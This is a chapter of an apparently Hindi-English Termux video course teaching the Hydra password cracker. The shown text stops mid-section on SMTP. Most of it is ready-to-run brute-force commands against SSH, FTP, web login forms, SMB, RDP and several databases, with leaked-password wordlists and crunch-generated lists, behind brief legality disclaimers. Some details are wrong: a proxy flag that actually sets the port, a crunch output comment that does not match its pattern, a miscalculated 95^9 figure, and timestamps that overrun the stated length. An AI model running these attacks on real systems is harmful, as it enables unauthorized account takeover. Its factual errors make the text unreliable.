# Chapter 31: Hydra - Password Cracking Basics

> **Module:** 6 - Security  
> **Chapter:** 31 of 61  
> **Duration:** 20-25 Minutes  
> **Difficulty:** ⭐⭐⭐ Intermediate  

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | Hydra installation, brute-force concepts, protocols |
| Commands Reference | 25+ Hydra commands with explanations |
| Practice Exercises | Hands-on password cracking tasks |
| Troubleshooting | Common Hydra errors and solutions |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 31
Title: Hydra Password Cracking Basics | Brute Force Attacks | T3rmuxk1ng
Duration: 20-25 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 0:50]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course by T3rmuxk1ng!

Aaj hum seekhenge ek bahut powerful tool - HYDRA! Ye tool password 
cracking ke liye use hota hai aur ethical hackers ke liye must-have 
tool hai.

Hydra kya karta hai? Ye online password cracking tool hai - matlab 
ye live services pe password try karta hai. SSH, FTP, HTTP, SMB - 
bhot saare protocols support karta hai.

Is chapter mein hum cover karenge:
- Hydra kya hai aur kaise kaam karta hai
- Brute-force attack kya hota hai
- Hydra installation Termux mein
- Supported protocols
- Basic aur advanced commands
- Wordlists kaise use karte hain
- Apni custom wordlist kaise banayein

⚠️ IMPORTANT: Ye video sirf educational purpose ke liye hai. 
Bina permission ke kisi pe attack karna ILLEGAL hai!

Play button dabaiye, like karein, subscribe karein!

---

[SECTION 1: WHAT IS HYDRA - 0:50 to 4:00]
─────────────────────────────────────────────────────────────────────────────

Sabse pehle samjhte hain - HYDRA kya hai?

Hydra ek parallelized login cracker hai. Iska kaam ye hai ki ye 
multiple protocols pe login attempts try kare - username aur 
password combinations ke saath.

┌─────────────────────────────────────────────────────────────────────────┐
│                    HYDRA - THE LEGENDARY PASSWORD CRACKER                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Developer: van Hauser / The Hackers Choice (THC)                       │
│  First Released: 2001                                                   │
│  Type: Online Password Cracker / Network Logon Cracker                  │
│  License: AGPL-3.0                                                      │
│                                                                          │
│  KEY FEATURES:                                                           │
│  ├── 50+ Supported Protocols                                            │
│  ├── Parallelized Attacks (Multi-threaded)                              │
│  ├── Modular Design                                                     │
│  ├── IPv4 and IPv6 Support                                              │
│  ├── SOCKS Proxy Support                                                │
│  ├── SSL/TLS Support                                                    │
│  └── Works on Linux, Windows, macOS, Android                            │
│                                                                          │
│  HYDRA vs JOHN THE RIPPER:                                              │
│  ───────────────────────────                                            │
│  • Hydra = Online cracking (live services)                              │
│  • John = Offline cracking (hash files)                                 │
│  • Hydra tries passwords on running services                            │
│  • John cracks stored password hashes                                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

Hydra ka naam "Hydra" isliye rakha gaya kyunki Greek mythology 
mein Hydra ek multi-headed snake thi - jaise ek head kat jata 
tha to do naye aa jate the. Similarly, Hydra multiple threads 
use karta hai - ek fail ho to dusra try kare.

Hydra use cases:
- Penetration testing
- Security auditing
- Password strength testing
- Account recovery (authorized)
- Security awareness training

---

[SECTION 2: BRUTE-FORCE ATTACK EXPLAINED - 4:00 to 7:30]
─────────────────────────────────────────────────────────────────────────────

Ab samjhte hain - BRUTE-FORCE ATTACK kya hoti hai?

┌─────────────────────────────────────────────────────────────────────────┐
│                    BRUTE-FORCE ATTACK TYPES                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. PURE BRUTE-FORCE                                                    │
│  ────────────────────                                                   │
│  Har possible combination try karna                                     │
│  Example: a, b, c... aa, ab, ac... aaa, aab...                         │
│                                                                          │
│  Time: Very Slow (exponential)                                         │
│  Success: Guaranteed (eventually)                                       │
│  Best for: Short passwords                                              │
│                                                                          │
│  2. DICTIONARY ATTACK                                                   │
│  ─────────────────────                                                  │
│  Pre-made wordlist use karna (common passwords)                         │
│  Example: password, 123456, qwerty, admin123...                        │
│                                                                          │
│  Time: Fast                                                             │
│  Success: Depends on wordlist quality                                   │
│  Best for: Common passwords                                             │
│                                                                          │
│  3. HYBRID ATTACK                                                       │
│  ─────────────────                                                      │
│  Dictionary + Brute-force combination                                   │
│  Example: password1, password2, Password!, Password@1...               │
│                                                                          │
│  Time: Medium                                                           │
│  Success: Good for variations                                           │
│  Best for: Password policies                                            │
│                                                                          │
│  4. CREDENTIAL STUFFING                                                 │
│  ────────────────────────                                               │
│  Leaked credentials from breaches use karna                             │
│  Example: Known email/password pairs from data breaches                │
│                                                                          │
│  Time: Very Fast                                                        │
│  Success: High if credentials leaked                                    │
│  Best for: Mass account testing                                         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

Hydra mainly Dictionary Attack aur Brute-force support karta hai.

MATH BEHIND BRUTE-FORCE:
────────────────────────

8-character password, lowercase letters only:
- Possible combinations: 26^8 = 208,827,064,576
- At 1000 tries/second: ~6.6 YEARS!

8-character password, mixed case + numbers + symbols:
- Possible combinations: 95^8 = 6,634,204,312,890,625
- At 1000 tries/second: ~210,000 YEARS!

Isliye wordlists use karte hain - common passwords try karna 
zyada efficient hai.

---

[SECTION 3: SUPPORTED PROTOCOLS - 7:30 to 10:00]
─────────────────────────────────────────────────────────────────────────────

Hydra 50+ protocols support karta hai! Dekhte hain major ones:

┌─────────────────────────────────────────────────────────────────────────┐
│                    HYDRA SUPPORTED PROTOCOLS                             │
├───────────────────┬─────────────────────────────────────────────────────┤
│ Protocol          │ Description / Use Case                             │
├───────────────────┼─────────────────────────────────────────────────────┤
│ SSH               │ Secure Shell - Remote login (Port 22)              │
│ FTP               │ File Transfer Protocol (Port 21)                   │
│ Telnet            │ Unencrypted remote login (Port 23)                 │
│ HTTP/HTTPS        │ Web authentication, forms                          │
│ SMB               │ Windows file sharing (Port 445)                    │
│ RDP               │ Remote Desktop Protocol (Port 3389)                │
│ VNC               │ Virtual Network Computing                          │
│ MySQL             │ Database server (Port 3306)                        │
│ PostgreSQL        │ Database server (Port 5432)                        │
│ MSSQL             │ Microsoft SQL Server (Port 1433)                   │
│ Oracle            │ Oracle database (Port 1521)                        │
│ SMTP              │ Email server (Port 25/587)                         │
│ POP3              │ Email retrieval (Port 110)                         │
│ IMAP              │ Email retrieval (Port 143)                         │
│ LDAP              │ Directory services (Port 389)                      │
│ RDP               │ Remote Desktop (Port 3389)                         │
│ VNC               │ Remote desktop viewer                              │
│ Cisco AAA         │ Cisco authentication                               │
│ Cisco enable      │ Cisco privileged mode                              │
│ SOCKS5            │ Proxy authentication                               │
│ RTSP              │ Streaming media                                    │
│ ICQ               │ Messaging protocol                                 │
│ IRC               │ Chat protocol                                      │
│ NNTP              │ Usenet news                                        │
│ PCAnywhere        │ Remote access                                      │
│ SIP               │ VoIP protocol                                      │
│ S7-300            │ Siemens PLC                                        │
│ SNMP              │ Network management                                 │
│ CVS               │ Version control                                    │
│ Subversion        │ Version control                                    │
│ Firebird          │ Database                                           │
│ AFP               │ Apple Filing Protocol                              │
│ NCP               │ Novell NetWare                                     │
│ Redis             │ In-memory database                                 │
│ MongoDB           │ NoSQL database                                     │
└───────────────────┴─────────────────────────────────────────────────────┘

Most commonly used: SSH, FTP, HTTP forms, SMB, MySQL

---

[SECTION 4: HYDRA INSTALLATION IN TERMUX - 10:00 to 12:30]
─────────────────────────────────────────────────────────────────────────────

Ab Hydra ko Termux mein install karte hain:

[SCREEN: Termux Terminal]

Step 1: Update packages
    pkg update && pkg upgrade -y

Step 2: Install Hydra
    pkg install hydra -y

Step 3: Verify installation
    hydra -h

Installation successful! Ab Hydra ready hai use ke liye.

┌─────────────────────────────────────────────────────────────────────────┐
│                    HYDRA INSTALLATION OUTPUT                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak                 │
│                                                                          │
│  Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]     │
│          [options] target service [options]                             │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

Hydra ke saath kuch dependencies bhi install hongi jo automatically 
install ho jaati hain.

Alternative methods:
    # From source (latest version)
    git clone https://github.com/vanhauser-thc/thc-hydra
    cd thc-hydra
    ./configure
    make
    make install

---

[SECTION 5: HYDRA BASIC SYNTAX - 12:30 to 16:00]
─────────────────────────────────────────────────────────────────────────────

Ab Hydra ki basic syntax samjhte hain:

┌─────────────────────────────────────────────────────────────────────────┐
│                    HYDRA COMMAND SYNTAX                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  BASIC FORMAT:                                                           │
│  hydra [options] target protocol                                        │
│                                                                          │
│  USERNAME OPTIONS:                                                       │
│  ─────────────────                                                       │
│  -l <username>    Single username try karna                             │
│  -L <file>        Username list file se try karna                       │
│                                                                          │
│  PASSWORD OPTIONS:                                                       │
│  ─────────────────                                                       │
│  -p <password>    Single password try karna                             │
│  -P <file>        Password list (wordlist) use karna                    │
│                                                                          │
│  COMBO OPTIONS:                                                          │
│  ────────────────                                                       │
│  -C <file>        username:password pairs file                          │
│                                                                          │
│  PERFORMANCE OPTIONS:                                                    │
│  ────────────────────                                                   │
│  -t <tasks>       Number of parallel threads (default: 16)              │
│  -T <tasks>       Tasks per host (for multiple hosts)                   │
│                                                                          │
│  OUTPUT OPTIONS:                                                         │
│  ────────────────                                                       │
│  -o <file>        Output file for found passwords                       │
│  -b <format>      Output format (text, json, grep)                      │
│                                                                          │
│  VERBOSE OPTIONS:                                                        │
│  ────────────────                                                       │
│  -v               Verbose mode                                          │
│  -V               Show each attempt                                     │
│  -vV              Both verbose options                                  │
│  -d               Debug mode                                            │
│                                                                          │
│  NETWORK OPTIONS:                                                        │
│  ────────────────                                                       │
│  -s <port>        Specify non-default port                              │
│  -S               Use SSL connection                                    │
│  -4               Use IPv4                                              │
│  -6               Use IPv6                                              │
│  -w <timeout>     Wait time for response (seconds)                      │
│  -W <wait>        Wait between connections                              │
│                                                                          │
│  MISC OPTIONS:                                                           │
│  ──────────────                                                         │
│  -e <options>     Additional checks:                                    │
│                   n = null password                                     │
│                   s = same as login (username = password)               │
│                   ns = both                                             │
│  -f               Exit after first found login                          │
│  -F               Exit after first found login (any host)               │
│  -M <file>        List of targets from file                             │
│  -h               Show help                                             │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

EXAMPLES:

# Single username + single password
hydra -l admin -p password123 192.168.1.1 ssh

# Single username + wordlist
hydra -l admin -P /path/to/wordlist.txt 192.168.1.1 ssh

# Username list + wordlist
hydra -L users.txt -P passwords.txt 192.168.1.1 ftp

# With verbose output
hydra -l admin -P passwords.txt -vV 192.168.1.1 ssh

# With output file
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

---

[SECTION 6: SSH BRUTE FORCE ATTACK - 16:00 to 19:00]
─────────────────────────────────────────────────────────────────────────────

SSH brute force sabse common use case hai. Dekhte hain kaise karte hain:

[SCREEN: Terminal demonstration]

# Basic SSH brute force with single username
hydra -l root -P passwords.txt ssh://192.168.1.100

# With custom port
hydra -l root -P passwords.txt -s 2222 ssh://192.168.1.100

# With threads and verbose
hydra -l root -P passwords.txt -t 4 -vV ssh://192.168.1.100

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Exit on first success
hydra -l root -P passwords.txt -f ssh://192.168.1.100

# With null password and same-as-login checks
hydra -l root -P passwords.txt -e ns ssh://192.168.1.100

┌─────────────────────────────────────────────────────────────────────────┐
│                    SSH BRUTE FORCE EXAMPLE OUTPUT                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Hydra v9.5 (c) 2023 by van Hauser/THC                                  │
│                                                                          │
│  [DATA] attacking ssh://192.168.1.100:22/                               │
│  [DATA] Attempting: login: root password: admin                         │
│  [DATA] Attempting: login: root password: password                      │
│  [DATA] Attempting: login: root password: 123456                        │
│  [22][ssh] host: 192.168.1.100 login: root password: toor               │
│  [STATUS] attack finished for 192.168.1.100 (valid pair found)          │
│                                                                          │
│  1 of 1 target successfully completed, 1 valid password found            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

SSH attack ke liye tips:
- Root username common hai
- 4 threads safe hai (zyada threads pe SSH drop kar sakta hai)
- -f use karein kyunki ek password mil gaya to aage try karna 
  time waste hai

---

[SECTION 7: FTP BRUTE FORCE ATTACK - 19:00 to 21:30]
─────────────────────────────────────────────────────────────────────────────

FTP servers pe bhi brute force common hai:

[SCREEN: Terminal demonstration]

# Basic FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# With custom port
hydra -l admin -P passwords.txt -s 2121 ftp://192.168.1.100

# With verbose and output
hydra -l admin -P passwords.txt -vV -o ftp_results.txt ftp://192.168.1.100

# Anonymous FTP check (if allowed)
hydra -l anonymous -p anonymous ftp://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt -t 8 ftp://192.168.1.100

FTP ke liye zyada threads use kar sakte ho compared to SSH.

---

[SECTION 8: HTTP FORM ATTACK - 21:30 to 25:00]
─────────────────────────────────────────────────────────────────────────────

Web login forms pe attack karna thoda complex hai. HTTP form 
attack ke liye form parameters samajhne padte hain.

┌─────────────────────────────────────────────────────────────────────────┐
│                    HTTP FORM ATTACK SYNTAX                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  FORMAT:                                                                 │
│  hydra -l <user> -P <pass_file> <target> http-post-form                 │
│        "<path>:<form_params>:<failure_string>"                          │
│                                                                          │
│  PARAMETERS:                                                             │
│  ───────────                                                             │
│  <path>          Login page path (e.g., /login.php)                     │
│  <form_params>   Form field names (username=^USER^&password=^PASS^)     │
│  <failure_string> Text shown on failed login                            │
│                                                                          │
│  SPECIAL VARIABLES:                                                      │
│  ─────────────────                                                       │
│  ^USER^   Will be replaced with username                                │
│  ^PASS^   Will be replaced with password                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

EXAMPLE:

# Web form brute force
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
      "/login.php:username=^USER^&password=^PASS^:Invalid login"

# With HTTPS
hydra -l admin -P passwords.txt -S 192.168.1.100 https-post-form \
      "/login:user=^USER^&pass=^PASS^:Incorrect"

# With cookies (for CSRF protection)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
      "/login:username=^USER^&password=^PASS^&token=abc123:Failed"

Failure string kaise dhundhein?
1. Login page pe galat credentials enter karein
2. Page pe jo error message aaye wo note karein
3. Wo message failure string hai

Common failure strings:
- "Invalid" / "Invalid login"
- "Incorrect" / "Incorrect password"
- "Failed" / "Login failed"
- "Error" / "Authentication error"
- "Wrong" / "Wrong password"

---

[SECTION 9: WORDLISTS MANAGEMENT - 25:00 to 28:00]
─────────────────────────────────────────────────────────────────────────────

Wordlists password cracking ka sabse important part hai.

┌─────────────────────────────────────────────────────────────────────────┐
│                    POPULAR WORDLISTS                                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. ROCKYOU.TXT (Most Famous)                                           │
│  ─────────────────────────────────                                      │
│  • 14.3 million passwords                                               │
│  • From 2009 RockYou breach                                             │
│  • Size: ~134 MB                                                        │
│                                                                          │
│  Download:                                                               │
│  wget https://github.com/danielmiessler/SecLists/raw/master/            │
│       Passwords/Leaked-Databases/rockyou.txt.tar.gz                     │
│                                                                          │
│  2. SECLISTS (Comprehensive)                                            │
│  ───────────────────────────                                            │
│  • Multiple categories                                                  │
│  • Install: pkg install seclists                                        │
│  • Location: $PREFIX/share/seclists/                                    │
│                                                                          │
│  3. OTHER WORDLISTS:                                                     │
│  ──────────────────                                                      │
│  • crackstation.txt - 1.5 billion passwords                            │
│  • darkweb2017.txt - Dark web leak                                     │
│  • probable-v2-top12000.txt - Top 12000 passwords                       │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

[SCREEN: Download rockyou.txt]

# Create wordlists directory
mkdir -p ~/wordlists
cd ~/wordlists

# Download rockyou.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# Extract
tar -xzf rockyou.txt.tar.gz

# Verify
wc -l rockyou.txt
# Output: 14344391 rockyou.txt

---

[SECTION 10: CREATING CUSTOM WORDLISTS - 28:00 to 31:00]
─────────────────────────────────────────────────────────────────────────────

Apni custom wordlist banane ke liye CRUNCH tool use karte hain:

[SCREEN: Terminal demonstration]

# Install crunch
pkg install crunch -y

# Basic usage - generate all 4-character passwords
crunch 4 4 abc123 -o wordlist.txt

# Generate 6-8 character passwords with specific charset
crunch 6 8 abcdefghij1234567890 -o wordlist.txt

# With pattern (hacker + 2 digits)
crunch 8 8 -t hacker@@ -o custom.txt

# With pattern (company name variations)
crunch 10 10 -t company@@@ -o company_pass.txt

┌─────────────────────────────────────────────────────────────────────────┐
│                    CRUNCH OPTIONS                                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  SYNTAX: crunch <min> <max> [charset] [options]                         │
│                                                                          │
│  OPTIONS:                                                                │
│  ────────                                                                │
│  -o <file>       Output file                                            │
│  -t <pattern>    Pattern (@ = lowercase, , = uppercase,                 │
│                          % = numbers, ^ = symbols)                      │
│  -b <size>       Split by size (KB, MB, GB)                             │
│  -c <number>     Number of lines per file                               │
│  -d <n>          Limit duplicate characters                             │
│  -s <start>      Start from specific word                               │
│  -p <text>       Permutation (no min/max needed)                        │
│                                                                          │
│  PATTERNS:                                                               │
│  ─────────                                                               │
│  @ = lowercase letters (a-z)                                            │
│  , = uppercase letters (A-Z)                                            │
│  % = numbers (0-9)                                                      │
│  ^ = symbols                                                            │
│                                                                          │
│  EXAMPLES:                                                               │
│  ──────────                                                              │
│  crunch 8 8 -t pass@@@@ -o output.txt                                   │
│  # Creates: passaa, passab, passac... passzz                            │
│                                                                          │
│  crunch 6 6 -t %%@@@@ -o numeric.txt                                    │
│  # Creates: 00aaaa, 00aaab... 99zzzz                                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

CeWL tool se website-based wordlist bhi bana sakte hain:
    # Install cewl (if available)
    gem install cewl
    
    # Generate wordlist from website
    cewl http://target-site.com -w website_words.txt

---

[SECTION 11: ADVANCED HYDRA OPTIONS - 31:00 to 34:00]
─────────────────────────────────────────────────────────────────────────────

Kuch advanced options jo useful hain:

┌─────────────────────────────────────────────────────────────────────────┐
│                    ADVANCED HYDRA OPTIONS                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  PROXY SUPPORT:                                                          │
│  ────────────────                                                        │
│  -sIP:port       Connect via SOCKS proxy                                │
│                                                                          │
│  hydra -s 127.0.0.1:9050 -l admin -P pass.txt target ssh                │
│                                                                          │
│  RESTORE OPTION:                                                         │
│  ────────────────                                                        │
│  If attack interrupted, resume from where it stopped                    │
│                                                                          │
│  hydra -R                                                                │
│                                                                          │
│  MULTIPLE TARGETS:                                                       │
│  ─────────────────                                                       │
│  hydra -M targets.txt -l admin -P pass.txt ssh                          │
│                                                                          │
│  COLORED OUTPUT:                                                         │
│  ────────────────                                                        │
│  hydra -l admin -P pass.txt -c ssh://target                             │
│                                                                          │
│  TIMEOUT OPTIONS:                                                        │
│  ────────────────                                                        │
│  -w 30           Wait 30 seconds for response                           │
│  -W 1            Wait 1 second between connections                      │
│                                                                          │
│  SPECIFIC SERVICE OPTIONS:                                               │
│  ────────────────────────                                                │
│  hydra target ssh -h                                                     │
│  # Shows SSH-specific options                                            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

---

[SECTION 12: SUMMARY & PREVIEW - 34:00 to 36:00]
─────────────────────────────────────────────────────────────────────────────

To dosto, Chapter 31 complete! Let's summarize:

✅ Hydra kya hai - Online password cracker
✅ Brute-force attack types
✅ 50+ supported protocols
✅ Installation Termux mein
✅ Basic syntax: -l, -L, -p, -P, -t, -vV, -o
✅ SSH brute force
✅ FTP brute force  
✅ HTTP form attack
✅ Wordlists management
✅ Custom wordlist creation with Crunch

┌─────────────────────────────────────────────────────────────────────────┐
│                    CHAPTER 31 - KEY COMMANDS                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  INSTALLATION:                                                           │
│  pkg install hydra -y                                                    │
│                                                                          │
│  SSH:                                                                    │
│  hydra -l root -P passwords.txt ssh://192.168.1.100                     │
│                                                                          │
│  FTP:                                                                    │
│  hydra -l admin -P passwords.txt ftp://192.168.1.100                    │
│                                                                          │
│  HTTP FORM:                                                              │
│  hydra -l admin -P pass.txt target http-post-form                       │
│       "/login:user=^USER^&pass=^PASS^:Invalid"                          │
│                                                                          │
│  WORDLIST:                                                               │
│  wget [rockyou.txt URL]                                                  │
│  crunch 8 8 -t hacker@@ -o custom.txt                                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

Next Chapter 32 mein hum seekhenge:
- Hydra advanced techniques
- Multi-service attacks
- Performance optimization
- Real-world scenarios
- Bypass techniques

⚠️ REMEMBER: Ye tools sirf authorized testing ke liye use karein!
Unauthorized hacking ILLEGAL hai aur jail ho sakti hai!

Agar video helpful lagi:
👍 Like karein
🔔 Subscribe karein, notification bell on karein
💬 Comments mein apne doubts poochein
📤 Share karein friends ke saath

Thank you for watching! See you in Chapter 32!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. Hydra Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         HYDRA ARCHITECTURE                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                        HYDRA CORE                                │   │
│   │   ├── Main Controller                                           │   │
│   │   ├── Thread Manager                                            │   │
│   │   ├── Input Parser                                              │   │
│   │   └── Output Handler                                            │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                     PROTOCOL MODULES                             │   │
│   │                                                                  │   │
│   │   ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐              │   │
│   │   │   SSH   │ │   FTP   │ │  HTTP   │ │   SMB   │              │   │
│   │   └─────────┘ └─────────┘ └─────────┘ └─────────┘              │   │
│   │   ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐              │   │
│   │   │  MySQL  │ │  SMTP   │ │   VNC   │ │   RDP   │              │   │
│   │   └─────────┘ └─────────┘ └─────────┘ └─────────┘              │   │
│   │                     ... 50+ modules ...                         │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                    NETWORK LAYER                                 │   │
│   │   ├── Socket Management                                         │   │
│   │   ├── SSL/TLS Support                                           │   │
│   │   ├── IPv4/IPv6                                                 │   │
│   │   └── SOCKS Proxy Support                                       │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. Attack Methodology

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    PASSWORD ATTACK WORKFLOW                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  STEP 1: RECONNAISSANCE                                                 │
│  ─────────────────────────                                              │
│  ├── Identify target services                                          │
│  ├── Find open ports (Nmap)                                            │
│  ├── Identify service versions                                         │
│  └── Discover login endpoints                                          │
│                                                                          │
│  STEP 2: WORDLIST PREPARATION                                           │
│  ─────────────────────────────                                          │
│  ├── Select appropriate wordlist                                       │
│  ├── Generate custom wordlist if needed                                │
│  ├── Consider password policies                                        │
│  └── Prepare username list                                             │
│                                                                          │
│  STEP 3: ATTACK CONFIGURATION                                           │
│  ─────────────────────────────                                          │
│  ├── Select protocol                                                   │
│  ├── Set thread count                                                  │
│  ├── Configure timeouts                                                │
│  └── Set output options                                                │
│                                                                          │
│  STEP 4: EXECUTION                                                      │
│  ────────────────                                                       │
│  ├── Start attack                                                      │
│  ├── Monitor progress                                                  │
│  ├── Adjust if needed                                                  │
│  └── Save results                                                      │
│                                                                          │
│  STEP 5: POST-PROCESSING                                                │
│  ────────────────────────                                               │
│  ├── Analyze results                                                   │
│  ├── Document findings                                                 │
│  ├── Test credentials                                                  │
│  └── Report generation                                                 │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 3. Performance Considerations

| Factor | Impact | Recommendation |
|--------|--------|----------------|
| Threads (-t) | More threads = faster | SSH: 4, FTP: 16, HTTP: 32 |
| Wordlist Size | Larger = more time | Use targeted wordlists |
| Network Latency | Higher = slower | Use -w to increase timeout |
| Target Response | Slow = bottlenecks | Reduce threads if target drops |
| CPU Power | More cores = better | Utilize multi-core processing |

### 4. Password Strength Analysis

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    PASSWORD CRACKING TIME ESTIMATES                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Password: "password" (8 chars, lowercase only)                         │
│  Combinations: 26^8 = 208 billion                                       │
│  Time at 1000/sec: ~6.6 years                                          │
│  Time with wordlist: < 1 second                                        │
│                                                                          │
│  Password: "P@ssw0rd!" (9 chars, mixed)                                 │
│  Combinations: 95^9 = ~630 trillion                                     │
│  Time at 1000/sec: ~20,000 years                                       │
│  Time with wordlist: < 1 second                                        │
│                                                                          │
│  Password: "Xk9#mL2$qW" (10 chars, random)                              │
│  Combinations: 95^10                                                    │
│  Time at 1000/sec: ~1.9 million years                                  │
│  Not in wordlists - practically uncrackable                            │
│                                                                          │
│  CONCLUSION: Use long, random, unique passwords!                        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 COMMANDS REFERENCE

### Installation Commands

```bash
# Update Termux packages
pkg update && pkg upgrade -y

# Install Hydra
pkg install hydra -y

# Verify installation
hydra -h
hydra --version

# Install additional tools
pkg install crunch -y          # Wordlist generator
pkg install nmap -y            # Port scanning
pkg install seclists           # Wordlist collection
pkg install git wget curl -y   # Essential utilities
```

### Basic Hydra Commands

```bash
# View help
hydra -h

# View protocol-specific help
hydra -U ssh
hydra -U ftp
hydra -U http-post-form

# Check supported protocols
hydra -h | grep -A 50 "Supported services"

# Test single login
hydra -l admin -p password123 192.168.1.1 ssh

# Test with wordlist
hydra -l admin -P wordlist.txt 192.168.1.1 ssh

# Multiple usernames
hydra -L users.txt -P wordlist.txt 192.168.1.1 ssh
```

### SSH Attacks

```bash
# Basic SSH brute force
hydra -l root -P passwords.txt ssh://192.168.1.100

# SSH with custom port
hydra -l root -P passwords.txt -s 2222 ssh://192.168.1.100

# SSH with verbose output
hydra -l root -P passwords.txt -vV ssh://192.168.1.100

# SSH with limited threads
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100

# SSH with output file
hydra -l root -P passwords.txt -o results.txt ssh://192.168.1.100

# SSH with multiple checks (null, same as login)
hydra -l root -P passwords.txt -e ns ssh://192.168.1.100

# SSH stop on first success
hydra -l root -P passwords.txt -f ssh://192.168.1.100

# SSH with username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# SSH with timeout
hydra -l root -P passwords.txt -w 30 ssh://192.168.1.100

# SSH over IPv6
hydra -l root -P passwords.txt -6 ssh://[::1]
```

### FTP Attacks

```bash
# Basic FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# FTP with custom port
hydra -l admin -P passwords.txt -s 2121 ftp://192.168.1.100

# FTP with verbose
hydra -l admin -P passwords.txt -vV ftp://192.168.1.100

# FTP with higher threads
hydra -l admin -P passwords.txt -t 16 ftp://192.168.1.100

# FTP anonymous check
hydra -l anonymous -p anonymous ftp://192.168.1.100

# FTP with output file
hydra -l admin -P passwords.txt -o ftp_results.txt ftp://192.168.1.100
```

### HTTP/HTTPS Attacks

```bash
# HTTP POST form attack
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
      "/login.php:username=^USER^&password=^PASS^:Invalid"

# HTTPS form attack
hydra -l admin -P passwords.txt -S 192.168.1.100 https-post-form \
      "/login:user=^USER^&pass=^PASS^:Incorrect"

# HTTP GET form attack
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form \
      "/login.php?user=^USER^&pass=^PASS^:Denied"

# HTTP Basic Authentication
hydra -l admin -P passwords.txt 192.168.1.100 http-get /admin/

# HTTP with custom port
hydra -l admin -P passwords.txt -s 8080 192.168.1.100 http-post-form \
      "/login:user=^USER^&pass=^PASS^:Failed"

# HTTP with cookies
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
      "/login:user=^USER^&pass=^PASS^&token=abc123:Invalid"

# HTTPS with proxy
hydra -l admin -P passwords.txt -s 127.0.0.1:9050 192.168.1.100 https-post-form \
      "/login:user=^USER^&pass=^PASS^:Failed"
```

### SMB/Windows Attacks

```bash
# SMB brute force
hydra -l admin -P passwords.txt 192.168.1.100 smb

# SMB with domain
hydra -l admin -P passwords.txt 192.168.1.100 smb //domain

# RDP brute force
hydra -l admin -P passwords.txt 192.168.1.100 rdp

# RDP with custom port
hydra -l admin -P passwords.txt -s 3390 192.168.1.100 rdp
```

### Database Attacks

```bash
# MySQL brute force
hydra -l root -P passwords.txt 192.168.1.100 mysql

# MySQL with custom port
hydra -l root -P passwords.txt -s 3307 192.168.1.100 mysql

# PostgreSQL brute force
hydra -l postgres -P passwords.txt 192.168.1.100 postgres

# MongoDB brute force
hydra -l admin -P passwords.txt 192.168.1.100 mongodb

# MSSQL brute force
hydra -l sa -P passwords.txt 192.168.1.100 mssql
```

### Email Attacks

```bash
# SMTP brute force
hydra -l admin@domain.com -P passwords.txt smtp://192.168.1.100

# SMTP with SSL
